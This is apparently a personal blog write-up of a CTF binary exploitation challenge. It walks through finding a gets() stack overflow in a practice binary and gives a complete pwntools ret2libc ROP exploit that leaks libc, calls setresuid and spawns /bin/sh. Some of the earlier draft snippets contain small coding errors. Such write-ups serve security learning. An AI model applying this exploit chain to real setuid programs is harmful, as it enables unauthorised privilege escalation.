---
layout: post
title: Writeup ~ YHROCUCTF - Binary Challenge 4
subtitle: My first touch with pwntools and ROP
#gh-repo: daattali/beautiful-jekyll
#gh-badge: [star, fork, follow]
tags: [ctf, writeup, pwn, rop]
comments: true
author: M0S4YSH3LL0
---

Welcome to my first ever writeup of an binary exploitation challenge I took in scope of the YHROCUCTF.

## Prologue

I took part in the CTF event of **YHROCU** (Yorkshire and Hamold Organised Crime Unit), the [YHROCUCTF](https://yhrocuctf.com/). It was super fun, most of all the binary exploitation challenge they provided. For this reason I want to do this writeup to let you guys be part of my thinking and learning process.

## The challenge

The description of the challenge is as follows:
```
Use the "binary-exploit-4" program to gain the privileges
of ctf-flag-4, once you have them run "newgrp" 
to be able to read the flag.

If you get the flag, Joe owes you a pint (as long as you explain how you did it + save your exploit to show him).

Seriously, fair play.

....good luck
```

You can download the binary [here]().

The challenge originally is hosted on a remote host, but I don't want to expose any credentials here, so for the real flag you need to sign up to the CTF's page.

When logging into the remote server as user `ctf-user-4`, we are presented with the binary as well as `flag.txt`, which is owned by `ctf-flag-4`. We somehow need to get privileges of `ctf-flag-4` through running the binary to see the flag.

In this writeup I will cover the `local` exploitation, so make sure to download the binary as well as create a `flag.txt` file which is owned by another user, so you can not access it by `cat`ing it.


## Analyising the binary

First let's check what we have here. To see what kind of binary we are working with, we can run the `file` command.

~~~
file ./binary-exploit-4 
~~~

~~~
binary-exploit-4: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f1b4bbf4c34b712b7ede57d6865746f8fb057424, for GNU/Linux 3.2.0, not stripped
~~~

As we can see, we are working with a `64-bit` executable which is not stripped, meaning we get some debugging symbols while analysing it with `gdb` later, sweet.

Now, we run the program to see what we are presented with.
~~~
./binary-exploit-4 
~~~

~~~
Hello there!
What is your name?
m0
Nice
~~~

We get asked what our name is and then are responded with the message "Nice"

Okay, now let's see how the program works in `gdb`. For this I use `pwndbg` which offers some neat additional functionality when analysing binaries.

~~~
pwndbg ./binary-exploit-4
~~~

Sooo, let us have a look what functions are in this binary and how the code flow is.

~~~
info functions
~~~

~~~
0x0000000000401000  _init
0x0000000000401070  puts@plt
0x0000000000401080  setresuid@plt
0x0000000000401090  geteuid@plt
0x00000000004010a0  gets@plt
0x00000000004010b0  _start
0x00000000004010e0  _dl_relocate_static_pie
0x00000000004010f0  deregister_tm_clones
0x0000000000401120  register_tm_clones
0x0000000000401160  __do_global_dtors_aux
0x0000000000401190  frame_dummy
0x0000000000401196  run
0x00000000004011da  main
0x0000000000401220  __libc_csu_init
0x0000000000401290  __libc_csu_fini
0x0000000000401298  _fini
~~~

As we can see we have two functions here, one is `main` and one is `run`. Since the entrypoint of the binary seems to be the `main` function, we want to inspect it first and have a look at the disassembly.

~~~
disassemble main
~~~
~~~
Dump of assembler code for function main:
   0x00000000004011da <+0>:	endbr64
   0x00000000004011de <+4>:	push   rbp
   0x00000000004011df <+5>:	mov    rbp,rsp
   0x00000000004011e2 <+8>:	sub    rsp,0x20
   0x00000000004011e6 <+12>:	mov    DWORD PTR [rbp-0x14],edi
   0x00000000004011e9 <+15>:	mov    QWORD PTR [rbp-0x20],rsi
   0x00000000004011ed <+19>:	call   0x401090 <geteuid@plt>
   0x00000000004011f2 <+24>:	mov    DWORD PTR [rbp-0x4],eax
   0x00000000004011f5 <+27>:	mov    edx,DWORD PTR [rbp-0x4]
   0x00000000004011f8 <+30>:	mov    ecx,DWORD PTR [rbp-0x4]
   0x00000000004011fb <+33>:	mov    eax,DWORD PTR [rbp-0x4]
   0x00000000004011fe <+36>:	mov    esi,ecx
   0x0000000000401200 <+38>:	mov    edi,eax
   0x0000000000401202 <+40>:	mov    eax,0x0
   0x0000000000401207 <+45>:	call   0x401080 <setresuid@plt>
   0x000000000040120c <+50>:	mov    eax,0x0
   0x0000000000401211 <+55>:	call   0x401196 <run>
   0x0000000000401216 <+60>:	mov    eax,0x0
   0x000000000040121b <+65>:	leave
   0x000000000040121c <+66>:	ret
~~~

For now, we only focus on the juicy parts, the `call` instructions.
First we `geteuid`, which gets the effective user id of the current user.
Then set up registers for the `setresuid` function call, which sets the real user id. Looks like a juicy function for use to make use of later in order to gain privileges of the user owning the `flag.txt`.
And last but not least, we call the `run` function, which we will inspect now.

~~~
disassemble run
~~~
~~~
Dump of assembler code for function run:
   0x0000000000401196 <+0>:	endbr64
   0x000000000040119a <+4>:	push   rbp
   0x000000000040119b <+5>:	mov    rbp,rsp
   0x000000000040119e <+8>:	sub    rsp,0x40
   0x00000000004011a2 <+12>:	lea    rdi,[rip+0xe5b]        # 0x402004
   0x00000000004011a9 <+19>:	call   0x401070 <puts@plt>
   0x00000000004011ae <+24>:	lea    rdi,[rip+0xe5c]        # 0x402011
   0x00000000004011b5 <+31>:	call   0x401070 <puts@plt>
   0x00000000004011ba <+36>:	lea    rax,[rbp-0x40]
   0x00000000004011be <+40>:	mov    rdi,rax
   0x00000000004011c1 <+43>:	mov    eax,0x0
   0x00000000004011c6 <+48>:	call   0x4010a0 <gets@plt>
   0x00000000004011cb <+53>:	lea    rdi,[rip+0xe52]        # 0x402024
   0x00000000004011d2 <+60>:	call   0x401070 <puts@plt>
   0x00000000004011d7 <+65>:	nop
   0x00000000004011d8 <+66>:	leave
   0x00000000004011d9 <+67>:	ret
~~~

Here we have 4 `call` instructions.
The first two `puts` calls will print out the greeting and the question for our name.
Before each call to `puts` we load some value into the `rdi` register, which is basically the first argument for our function according to `x86_64` calling conventions.

Let's have a look what we load into `rdi` for the first two `puts` calls:
~~~
x/s 0x402004
~~~
~~~
0x402004:	"Hello there!"
~~~

~~~
x/s 0x402011
~~~
~~~
0x402011:	"What is your name?"
~~~

The next function call is the one we are patiently waiting for: the call to the dangerous function `gets`.
This is our entry ticket into controlling the code flow of this binary. Let's find out how much input we can provide to make the binary crash with a `segmentation fault`.

Before we tinker around with the input, we want to set a breakpoint to `ret` of the `run` function.

~~~
b *0x00000000004011d9
~~~

Now let's craft a unique pattern, so in case we overwrite some return address, we can then easily check at what position of our input we overwrite.

I do this with `cyclic` module of `pwntools`, for now we create a unique pattern with 100 characters:
~~~
cyclic 100
~~~
~~~
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
~~~

Let's execute the binary in `pwndbg`:
~~~
run
~~~

When we get asked for our name we copy our unique pattern and shoot.

This is what we get:
~~~
 â–º 0x4011d9 <run+67>    ret    <0x616161616161616a>
~~~

Jackpot! We triggered a segmentation fault in the binary because our pattern overwrote the return address of the `run` function.

We overwrote the return address with `0x616161616161616a`, nice!

Next we want to check at which offset we overwrote, with:
~~~
cyclic -l 0x616161616161616a
~~~
~~~
Finding cyclic pattern of 8 bytes: b'jaaaaaaa' (hex: 0x6a61616161616161)
Found at offset 72
~~~

This means we need to provide `72` characters of input before we overwrite the return address. Cool! Now we control the code flow!

So, what to do now?
We somehow need to return to `setresuid` function to set our uid to the one of `flag.txt` owner.

To do this we need to assemble a ROP chain.

## Exploit strategy
Since we are controlling the code flow now, we need to think about on how to abuse this.

The strategy is as follows:
- Fill the buffer with junk of `72` characters
- populate `rdi` with our target uid, since it is the first argument for our `setresuid` call
- call to `setresuid`
- populate `rdi` with `/bin/sh`
- call to `system`
- call to `exit`


But wait... we don't have any references to `system` or a string with `/bin/sh` in our challenge binary...

Hmmmm... 

I have an idea! 
Maybe we can use already built-in code for the used `libc` of the challenge binary and look for remaining stuff there.

This technique is called `ret2libc`.

The only problem is, that `libc` is loaded into different areas of our memory each time we execute the binary.

So we need to think of a way to somehow leak a memory address of a function on runtime and then use it to calculate the base address of `libc` to later find our symbols and functions.

We can make use of the `puts` function to literally print out the memory address of a given function, eg.: `gets` on runtime.

Okay, so we need to have two stages of our chain.
The first one is to print out the memory address of a function of `libc` on runtime, return to `run` function to send the second stage and use this leaked address to calucate the base address of `libc`.

The second stage consists of populating `rdi` for `setresuid`, call `setresuid`, populate `rdi` with `/bin/sh` which we will propably find in `libc` as well as the function call to `system`.

Okay, let's find our gadgets!


## Writing our exploit
To pull of a `ret2libc` exploit, we need to find some useful ROP gadgets in order to achive our goal.

Let's fire up our favorite IDE and start:

```python
from pwn import *

context.arch = 'amd64'

elf = ELF(./binary-exploit-4)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
p = elf.process()
```

There we import our useful `pwntools` functions as well as create an ELF object of the binary and start a process out of it.
Also we load our local `libc` into an ELF object to later use it to find our gadgets.

```python
rop = ROP(elf)
rop.call(elf.symbols['puts'], [elf.got['gets']])
rop.call(elf.symbols['run'])
```
We use `ROP` object of `pwntools` to simply make a call to `puts` with an argument: the GOT entry of the function `gets`.
Since `gets` is a shared function of `libc` the GOT entry is the relative offset in memory of `gets`.
And then we return to `run` for our second stage.

```python
p.recvuntil(b"name?\n")

stage1 = b''.join([
     junk,
     rop.chain()
])

p.sendline(stage1)
ret = p.recv(2048).rstrip(b"\nHello there!\nWhat is your name?").lstrip(b"Nice\n").ljust(8, b'\x00')

gets_addr_bin = u64(ret)
gets_libc_addr = libc.symbols['gets']
libc_base_addr = gets_addr_bin - gets_addr_libc
libc.address = libc_base_addr

log.info(f"gets (libc) @ {hex(gets_addr_libc)}")
log.info(f"gets (elf) @ {hex(gets_addr_bin)}")
log.info(f"libc base @ {hex(libc.address)}")
```

Here we recive bytes from our process up until we get asked for our name.

Then we assemble our first stage of the payload and format it as binary string and send it.

We then recieve our address of `gets` within the binary on runtime, strip it a bit and pad it and unpack the binary data into an integer.

Now we are able to calculate the base address of `libc` by substracting the `gets` address within `libc` from the `gets` address we just leaked out of memory on runtime.

Stage 1 cleared! Ready for stage 2?

For the second stage we need to do some further work:

```python
pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"])[0]
system_addr = libc.symbols['system']
bin_sh = next(libc.search(b"/bin/sh\x00"))
exit_addr = libc.symbols['exit']

log.info(f"pop rdi gadget @ {hex(pop_rdi_ret)}")
log.info(f"system @ {hex(system_addr)}")
log.info(f"bin_sh @ {hex(bin_sh)}")
log.info(f"exit @ {hex(exit_addr)}")

stage2 = b''.join([
    junk,
    p64(pop_rdi_ret),
    p64(uid),
    p64(setresuid_addr),
    p64(pop_rdi_ret),
    p64(bin_sh),
    p64(system_addr),
    p64(exit_addr)
])
```

The first gadget we want to look for is one to populate the `rdi` register and then return back. 
So: we need a `pop rdi; ret` gadget.
Then, since we now successfully set the base address of `libc` we simply can read the symbol `system` and get the correct address of the symbol.

Next, we need to search for the string `/bin/sh` in order to use it as first argument.

Last but not least we want to `exit` out to have a clean flow.

Then we are able to assemble our stage 2:
- fill it with junk
- our `pop rdi; ret` gadget
- followed by the target uid we want to set in `rdi`
- call to `setresuid`
- again our `pop rdi; ret` gadget to populate `rdi` again for `system` call
- call to `system` and `exit`


Now we just need to send the payload:
```python
p.sendline(stage2)
p.interactive()
```

When running the exploit script, we then see:

~~~
[*] Loaded 14 cached gadgets for './binary-exploit-4'
[*] gets (libc) @ 0x76f30
[*] gets (elf) @ 0x7f20fa940f30
[*] libc base @ 0x7f20fa8ca000
[*] pop rdi gadget @ 0x401283
[*] system @ 0x7f20fa916330
[*] bin_sh @ 0x7f20faa60031
[*] exit @ 0x7f20fa908590
[*] Switching to interactive mode
Nice
$ id
uid=1002(ctf-flag-4) gid=0(root) groups=0(root),111(kismet)
$  
~~~

JACKPOT! We got a shell as well as set uid to `1002` = `ctf-flag-4`.

Now simply run `newgrp` and then we can `cat` our precious `flag.txt`!


## Final exploit (cleaned up and made pretty)

```python
from pwn import *


context.arch = 'amd64'
elf = ELF('./binary-exploit-4')
p = elf.process()
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')

gets_addr_libc = libc.symbols['gets']
gets_addr_bin = None
setresuid_addr = elf.plt['setresuid']
libc_base_addr = None

offset = 72

uid = 1002

junk = b'A' * offset

### STAGE 1 to get libc base address
rop = ROP(elf)
rop.call(elf.symbols['puts'], [elf.got['gets']])
rop.call(elf.symbols['run'])

p.recvuntil(b"name?\n")

stage1 = b''.join([
     junk,
     rop.chain()
])

p.sendline(stage1)
ret = p.recv(2048).rstrip(b"\nHello there!\nWhat is your name?").lstrip(b"Nice\n").ljust(8, b'\x00')

gets_addr_bin = u64(ret)

## calculate libc base address so we can find gadgets
libc_base_addr = gets_addr_bin - gets_addr_libc
libc.address = libc_base_addr

log.info(f"gets (libc) @ {hex(gets_addr_libc)}")
log.info(f"gets (elf) @ {hex(gets_addr_bin)}")
log.info(f"libc base @ {hex(libc.address)}")


### STAGE 2 for final exploiting, ROP chain of pop gadgets and finally /bin/sh
pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"])[0]
system_addr = libc.symbols['system']
bin_sh = next(libc.search(b"/bin/sh\x00"))
exit_addr = libc.symbols['exit']

log.info(f"pop rdi gadget @ {hex(pop_rdi_ret)}")
log.info(f"system @ {hex(system_addr)}")
log.info(f"bin_sh @ {hex(bin_sh)}")
log.info(f"exit @ {hex(exit_addr)}")

stage2 = b''.join([
    junk,
    p64(pop_rdi_ret),
    p64(uid),
    p64(setresuid_addr),
    p64(pop_rdi_ret),
    p64(bin_sh),
    p64(system_addr),
    p64(exit_addr)
])

p.sendline(stage2)
p.interactive()
```

## Epilogue

While working on this challenge I had a great learning experience. I learned about `ROP` in general as well as the usage of `pwntools`.

I'm grateful for any feedback, since I know my writing as well as explanation is far from technically correct haha! I want to improve and learn more!